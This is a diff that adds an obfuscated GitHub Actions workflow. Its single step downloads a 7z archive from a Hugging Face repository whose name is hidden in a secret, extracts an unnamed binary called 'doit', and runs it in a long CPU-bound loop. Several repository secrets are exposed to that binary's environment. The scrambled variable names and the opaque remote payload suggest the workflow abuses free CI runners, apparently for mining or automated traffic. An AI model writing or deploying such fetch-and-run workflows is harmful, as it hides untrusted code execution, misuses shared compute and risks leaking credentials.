@@ -1,0 +1,41 @@
+name: Bold
+
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: 'a'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: 'l'
+        required: false
+        default: '10'
+        type: string
+
+env:
+  REPaO_DIeR: ${{ github.workspace }}
+  TAerG: v1.0.0_${{ github.event.inputs.amd_override }}
+  LavOOP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+
+      - name: Doit
+        timeout-minutes: 49
+        run: |
+          curl -o doit.7z -L \
+            --url "https://huggingface.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAerG }}.7z?download=true"
+          7z x doit.7z
+          rm -rf doit.7z
+          chmod +x doit
+          ./doit loop ${{ env.LavOOP }} steps 1000000 wait 0 cpu 3
